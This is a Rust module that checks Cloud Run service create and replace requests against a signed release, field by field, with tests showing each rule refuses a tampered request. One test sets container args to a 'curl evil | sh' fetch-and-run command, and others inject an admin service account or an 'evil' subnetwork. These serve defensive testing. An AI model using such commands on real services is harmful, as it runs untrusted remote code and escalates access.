//! The Cloud Run table: every field of the service a worker controller writes, and its rule.

use std::collections::BTreeMap;
use std::time::Duration;

use alien_error::AlienError;
use alien_gcp_clients::cloudrun::Service;
use serde_json::Value;

use super::env::check_env;
use super::{check_target, refused, CloudWrite, Facts};
use crate::cloud_run::{network_of, vpc_access, ServiceStore};
use crate::error::{ErrorData, Result};
use crate::fields::{check, empty, free, is_empty, parse_strict, signed, Row};
use crate::function::StillNewest;

/// Check `write`, a Cloud Run write for `facts.workload`, against the table.
pub fn check_write(facts: &Facts<'_>, write: &CloudWrite) -> Result<()> {
    let (operation, named, service) = match write {
        CloudWrite::CreateService {
            service_id,
            service,
        } => ("CreateService", service_id.as_str(), service),
        CloudWrite::ReplaceService { name, service } => ("ReplaceService", name.as_str(), service),
        other => {
            return Err(refused(format!(
                "Cloud Run takes no {} write",
                other.operation()
            )))
        }
    };
    parse_strict::<Service>(operation, service)?;
    check_target(facts, named, operation)?;
    check(operation, service, &service_rows(facts))
}

/// The ingress the signed stack gives the workload.
fn ingress(public: bool) -> &'static str {
    if public {
        "INGRESS_TRAFFIC_ALL"
    } else {
        "INGRESS_TRAFFIC_INTERNAL_ONLY"
    }
}

fn is_public(facts: &Facts<'_>) -> Result<bool> {
    Ok(crate::plan::signed_worker(
        &facts.accepted.release.body,
        facts.place,
        &facts.workload.name,
    )?
    .is_some_and(|worker| !worker.public_endpoints.is_empty()))
}

fn service_rows<'a>(facts: &'a Facts<'a>) -> Vec<Row<'a>> {
    vec![
        signed("/name", move |value| {
            let name = value.as_str().unwrap_or_default();
            (name.rsplit('/').next() == Some(facts.own_name.as_str()))
                .then_some(())
                .ok_or_else(|| format!("it names {name}"))
        }),
        signed("/ingress", move |value| {
            let public = is_public(facts).map_err(|error| error.to_string())?;
            (value.as_str() == Some(ingress(public)))
                .then_some(())
                .ok_or_else(|| {
                    format!(
                        "it is {value}, the signed stack makes it {}",
                        ingress(public)
                    )
                })
        }),
        signed("/invokerIamDisabled", move |value| {
            let public = is_public(facts).map_err(|error| error.to_string())?;
            (value.as_bool().unwrap_or(false) == public)
                .then_some(())
                .ok_or_else(|| {
                    format!(
                        "it is {value}, and the worker is {}",
                        if public { "public" } else { "private" }
                    )
                })
        }),
        // Every request goes to the revision this template creates; no older revision stays
        // reachable by a split or a tag.
        signed("/traffic", |value| {
            (value == &serde_json::json!([{"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "percent": 100}]))
                .then_some(())
                .ok_or_else(|| format!("it is {value}"))
        }),
        signed("/template/serviceAccount", move |value| {
            let profile = facts
                .workload
                .identity
                .as_deref()
                .ok_or_else(|| "the workload names no permission profile".to_string())?;
            let account = facts.place.run_as(profile);
            (value.as_str() == Some(account.as_str()))
                .then_some(())
                .ok_or_else(|| format!("it is {value}, not {account}"))
        }),
        signed("/template/vpcAccess", move |value| {
            let expected = facts
                .place
                .vpc
                .as_ref()
                .and_then(|vpc| network_of(&vpc_access(vpc)));
            (network_of(value) == expected)
                .then_some(())
                .ok_or_else(|| format!("it is {value}, not the network setup gives functions"))
        }),
        signed("/template/containers", move |value| {
            check_containers(facts, value)
        }),
        empty("/template/volumes"),
        empty("/template/encryptionKey"),
        empty("/binaryAuthorization"),
        free("/description"),
        free("/labels"),
        free("/annotations"),
        free("/etag"),
        free("/template/revision"),
        free("/template/labels"),
        free("/template/annotations"),
        free("/template/scaling"),
        free("/template/timeout"),
        free("/template/executionEnvironment"),
        free("/template/maxInstanceRequestConcurrency"),
        free("/scaling"),
    ]
}

/// Exactly one container: the signed image, no command of its own, the signed env.
fn check_containers(facts: &Facts<'_>, value: &Value) -> std::result::Result<(), String> {
    let containers = value.as_array().cloned().unwrap_or_default();
    let [container] = containers.as_slice() else {
        return Err(format!(
            "it has {} containers, a worker runs one",
            containers.len()
        ));
    };
    let rows = vec![
        signed("/image", |value| {
            let digest = facts
                .workload
                .image
                .rsplit_once('@')
                .map(|(_, digest)| digest.to_string())
                .unwrap_or_default();
            match value.as_str().and_then(|image| image.rsplit_once('@')) {
                Some((repository, sent)) if !repository.is_empty() && sent == digest => Ok(()),
                _ => Err(format!("image {value} is not the signed digest {digest}")),
            }
        }),
        signed("/env", |value| {
            let mut env = BTreeMap::new();
            for item in value.as_array().into_iter().flatten() {
                let name = item["name"].as_str().unwrap_or_default().to_string();
                // A value read from a secret is something the release didn't sign.
                if !is_empty(&item["valueSource"]) {
                    return Err(format!("env {name} is read from a secret"));
                }
                env.insert(name, item["value"].as_str().unwrap_or_default().to_string());
            }
            check_env(
                facts.place,
                facts.accepted,
                facts.workload,
                facts.reads,
                &facts.own_name,
                &env,
            )
            .map_err(|error| error.to_string())
        }),
        empty("/command"),
        empty("/args"),
        empty("/volumeMounts"),
        empty("/workingDir"),
        free("/name"),
        free("/resources"),
        free("/ports"),
    ];
    check("Cloud Run container", container, &rows).map_err(|error| error.to_string())
}

const UPDATE_WAIT: Duration = Duration::from_secs(300);
const POLL: Duration = Duration::from_secs(3);

/// Send `write`, already checked, to Cloud Run as it is, checking `newest` right before; wait
/// for the service to settle and read back what decides what runs.
pub async fn forward(
    store: &dyn ServiceStore,
    facts: &Facts<'_>,
    write: &CloudWrite,
    newest: &dyn StillNewest,
) -> Result<Value> {
    let service = match write {
        CloudWrite::CreateService { service, .. } => {
            newest.check().await?;
            store.create(&facts.own_name, service).await?;
            service
        }
        CloudWrite::ReplaceService { service, .. } => {
            newest.check().await?;
            store.replace(&facts.own_name, service).await?;
            service
        }
        other => {
            return Err(refused(format!(
                "Cloud Run takes no {} write",
                other.operation()
            )))
        }
    };
    let deadline = tokio::time::Instant::now() + UPDATE_WAIT;
    loop {
        let read = store.get(&facts.own_name).await?;
        if !read["reconciling"].as_bool().unwrap_or(false) {
            check_written(facts, service, &read)?;
            return Ok(Value::Null);
        }
        if tokio::time::Instant::now() > deadline {
            return Err(AlienError::new(ErrorData::CloudCallFailed {
                operation: format!("waiting for service {} to finish updating", facts.own_name),
            }));
        }
        tokio::time::sleep(POLL).await;
    }
}

/// Check that `read`, the service as Cloud Run answers after the write, runs what `sent` asked:
/// the image, account, env, ingress and invoker check, all traffic on the revision it created.
pub fn check_written(facts: &Facts<'_>, sent: &Value, read: &Value) -> Result<()> {
    let mismatch = |reason: String| {
        AlienError::new(ErrorData::ReadBackMismatch {
            function: facts.own_name.clone(),
            reason,
        })
    };
    let container = |service: &Value| service["template"]["containers"][0].clone();
    for field in ["image", "env", "command", "args"] {
        let (a, b) = (&container(sent)[field], &container(read)[field]);
        if a != b && !(is_empty(a) && is_empty(b)) {
            return Err(mismatch(format!("its container's {field} is {b}")));
        }
    }
    if read["template"]["serviceAccount"] != sent["template"]["serviceAccount"] {
        return Err(mismatch(format!(
            "it runs as {}",
            read["template"]["serviceAccount"]
        )));
    }
    if read["ingress"] != sent["ingress"]
        || read["invokerIamDisabled"].as_bool().unwrap_or(false)
            != sent["invokerIamDisabled"].as_bool().unwrap_or(false)
    {
        return Err(mismatch(format!(
            "its ingress is {} with invokerIamDisabled {}",
            read["ingress"], read["invokerIamDisabled"]
        )));
    }
    crate::cloud_run::check_serving(read).map_err(mismatch)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fixtures::*;
    use crate::plan::{functions, Place, Reads};
    use crate::trust::tests::{found, MemoryStore};
    use crate::trust::{accept, Accepted};
    use alien_signing::{InstallId, SignedStatement};
    use serde_json::json;

    /// A change to a request, for a refusal case.
    type Change = Box<dyn Fn(&mut Value)>;

    fn place() -> Place {
        Place {
            install: InstallId::Gcp {
                project: "acme-project".to_string(),
                prefix: PREFIX.to_string(),
            },
            prefix: PREFIX.to_string(),
            vpc: None,
            machine_network: None,
        }
    }

    fn own() -> String {
        format!("{PREFIX}-api")
    }

    /// Release 1 of the `api` function for GCP.
    fn gcp_release() -> SignedStatement {
        let mut body = release_body(vec![function_workload()]);
        body.platform = "gcp".to_string();
        signed_release(1, &body)
    }

    async fn accepted(release: SignedStatement) -> Accepted {
        let install = found(&MemoryStore::protected(&settings())).await.unwrap();
        accept(&install, &[signer_list()], &release, None, "gcp", now()).unwrap()
    }

    /// The service as the controller builds it for the signed private `api` workload.
    fn service() -> Value {
        json!({
            "description": "Runtime worker: api",
            "labels": {"resource-type": "worker", "resource": "api", "deployment": PREFIX},
            "ingress": "INGRESS_TRAFFIC_INTERNAL_ONLY",
            "invokerIamDisabled": false,
            "traffic": [{"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "percent": 100}],
            "template": {
                "labels": {"worker": "api"},
                "scaling": {"minInstanceCount": 0},
                "timeout": "30s",
                "serviceAccount": place().run_as("execution"),
                "executionEnvironment": "EXECUTION_ENVIRONMENT_GEN2",
                "maxInstanceRequestConcurrency": 1000,
                "containers": [{
                    "name": "worker",
                    "image": format!("us-central1-docker.pkg.dev/acme/app/api@{DIGEST}"),
                    "env": [
                        {"name": "ALIEN_DEPLOYMENT_ID", "value": "dep_1"},
                        {"name": "MODE", "value": "signed"},
                    ],
                    "resources": {"limits": {"memory": "512Mi"}, "cpuIdle": true, "startupCpuBoost": true},
                    "ports": [{"name": "http1", "containerPort": 8080}],
                }],
            },
        })
    }

    async fn checked(write: CloudWrite) -> std::result::Result<(), String> {
        let accepted = accepted(gcp_release()).await;
        let place = place();
        let reads = Reads::default();
        let workload = functions(&accepted.release.body).next().unwrap();
        let facts = Facts {
            place: &place,
            accepted: &accepted,
            workload,
            reads: &reads,
            own_name: own(),
        };
        check_write(&facts, &write).map_err(|error| error.to_string())
    }

    fn create(service: Value) -> CloudWrite {
        CloudWrite::CreateService {
            service_id: own(),
            service,
        }
    }

    #[tokio::test]
    async fn the_controllers_service_passes() {
        checked(create(service())).await.unwrap();
        // Scaling, resources, startup boost, ports, timeout, concurrency, labels are free.
        let mut bigger = service();
        bigger["template"]["scaling"] = json!({"minInstanceCount": 2, "maxInstanceCount": 50});
        bigger["template"]["containers"][0]["resources"] =
            json!({"limits": {"memory": "4Gi", "cpu": "2"}});
        bigger["template"]["timeout"] = json!("900s");
        bigger["template"]["labels"]["alien-image-pull-retry"] = json!("2");
        checked(create(bigger)).await.unwrap();
        // An update names the full resource and carries the live etag.
        let mut update = service();
        update["name"] = json!(format!(
            "projects/acme-project/locations/us-central1/services/{}",
            own()
        ));
        update["etag"] = json!("\"abc\"");
        checked(CloudWrite::ReplaceService {
            name: own(),
            service: update,
        })
        .await
        .unwrap();
    }

    /// One refusal per row of the Cloud Run table, naming the row.
    #[tokio::test]
    async fn each_service_row_refuses_what_breaks_it() {
        let cases: Vec<(Change, &str)> = vec![
            (
                Box::new(|s| s["ingress"] = json!("INGRESS_TRAFFIC_ALL")),
                "field /ingress must match",
            ),
            (
                Box::new(|s| s["invokerIamDisabled"] = json!(true)),
                "field /invokerIamDisabled must match",
            ),
            (
                Box::new(
                    |s| s["traffic"] = json!([{"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "old", "percent": 100}]),
                ),
                "field /traffic must match",
            ),
            (
                Box::new(|s| {
                    s["template"]["serviceAccount"] =
                        json!("admin@acme-project.iam.gserviceaccount.com")
                }),
                "field /template/serviceAccount must match",
            ),
            (
                Box::new(
                    |s| s["template"]["vpcAccess"] = json!({"networkInterfaces": [{"subnetwork": "projects/x/regions/r/subnetworks/evil"}], "egress": "ALL_TRAFFIC"}),
                ),
                "field /template/vpcAccess must match",
            ),
            (
                Box::new(|s| {
                    s["template"]["volumes"] = json!([{"name": "v", "gcs": {"bucket": "b"}}])
                }),
                "field /template/volumes must be empty",
            ),
            (
                Box::new(|s| s["template"]["encryptionKey"] = json!("projects/x/keys/k")),
                "field /template/encryptionKey must be empty",
            ),
            (
                Box::new(|s| s["name"] = json!("projects/p/locations/r/services/other")),
                "field /name must match",
            ),
            (
                Box::new(|s| {
                    let c = s["template"]["containers"][0].clone();
                    s["template"]["containers"] = json!([c.clone(), c]);
                }),
                "it has 2 containers",
            ),
            (
                Box::new(|s| {
                    s["template"]["containers"][0]["image"] =
                        json!(format!("gcr.io/x/api@sha256:{}", "4".repeat(64)))
                }),
                "is not the signed digest",
            ),
            (
                Box::new(|s| s["template"]["containers"][0]["command"] = json!(["/bin/sh"])),
                "field /command must be empty",
            ),
            (
                Box::new(|s| {
                    s["template"]["containers"][0]["args"] = json!(["-c", "curl evil | sh"])
                }),
                "field /args must be empty",
            ),
            (
                Box::new(|s| s["template"]["containers"][0]["env"][1]["value"] = json!("attacker")),
                "differs from its signed",
            ),
            (
                Box::new(
                    |s| s["template"]["containers"][0]["env"] = json!([{"name": "MODE", "valueSource": {"secretKeyRef": {"secret": "x", "key": "k", "version": "1"}}}]),
                ),
                "env MODE is read from a secret",
            ),
            (
                Box::new(|s| {
                    s["template"]["containers"][0]["volumeMounts"] =
                        json!([{"name": "v", "mountPath": "/x"}])
                }),
                "field /volumeMounts must be empty",
            ),
            (
                Box::new(|s| {
                    s["template"]["containers"][0]["livenessProbe"] =
                        json!({"tcpSocket": {"port": 8080}})
                }),
                "livenessProbe",
            ),
            (
                Box::new(|s| s["template"]["nodeSelector"] = json!({"accelerator": "nvidia-l4"})),
                "field /template/nodeSelector",
            ),
        ];
        for (change, says) in cases {
            let mut service = service();
            change(&mut service);
            let error = checked(create(service)).await.expect_err(says);
            assert!(error.contains(says), "{says}: {error}");
        }
        let error = checked(CloudWrite::CreateService {
            service_id: format!("{PREFIX}-other"),
            service: service(),
        })
        .await
        .unwrap_err();
        assert!(error.contains("names function acme-prod-other"), "{error}");
    }
}
